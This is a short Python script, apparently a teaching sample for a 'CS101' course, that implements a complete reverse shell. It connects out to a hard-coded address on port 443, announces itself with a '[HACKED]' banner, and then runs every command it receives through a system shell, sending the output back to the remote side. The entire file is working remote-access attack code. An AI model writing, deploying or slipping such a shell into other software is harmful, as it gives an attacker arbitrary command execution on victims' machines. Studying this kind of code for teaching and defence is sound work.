#!/usr/bin/python

import os
import socket
import subprocess

HOST = '192.168.123.100' # IP Address
PORT = 443 # Port Number

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[HACKED] THIS IS SIMPLE REVERSE SHELL WRITTEN IN PYTHON FOR CS101 COURSE\n")) # Send connection confirmation.


while True:
    data = s.recv(1024).decode("UTF-8")
    if len(data) > 0:
        print("[HACKED] THE ATTACKER IS EXECUTING \"" + data.strip() + "\" COMMAND!")
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        stdout_value = proc.stdout.read() + proc.stderr.read()
        output_str = str(stdout_value, "UTF-8")
        s.send(str.encode(output_str + "\n"))